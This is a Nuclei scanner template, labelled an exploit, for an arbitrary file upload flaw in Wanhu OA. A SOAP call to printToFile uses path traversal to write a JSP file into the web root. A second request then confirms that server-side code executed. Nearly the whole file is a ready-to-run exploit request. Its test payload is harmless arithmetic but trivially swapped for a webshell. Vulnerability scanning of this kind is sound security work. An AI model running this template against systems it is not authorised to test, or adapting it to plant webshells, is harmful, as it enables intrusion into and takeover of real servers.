nuclei/万户OA-filetest-1-任意文件上传_exp.yaml

id: wanhu-filetest-fileupload

info:
  name: wanhu-filetest-fileupload
  author: msk

variables:
  filename: "{{to_lower(rand_base(10))}}"

requests:
  - raw:
      - |
        POST /defaultroot/services/FileTest;1.js HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
        Connection: close
        Accept: */*
        SOAPAction: ""
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,fil;q=0.6
        Cache-Control: no-cache
        Content-Type: text/xml;charset=UTF-8
        Pragma: no-cache
        
        <soapenv:Envelope
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
            xmlns:util="http://com.whir.ezoffice.ezform.util.StringUtil"
            xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
            <soapenv:Header/>
            <soapenv:Body>
                <util:printToFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                    <fileName xsi:type="soapenc:string">../server/oa/deploy/defaultroot.war/public/upload/{{filename}}.jsp.</fileName>
                    <content xsi:type="soapenc:string">{{html_escape("<% out.print(1234*1234);%>")}}</content>
                </util:printToFile>
            </soapenv:Body>
        </soapenv:Envelope>

      - |
        GET /defaultroot/public/upload/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en
        Connection: close


    matchers:
      - type: dsl
        dsl:
          - "status_code_1==200 &&  contains(body_2,'1522756') && contains(body_1,'soap')"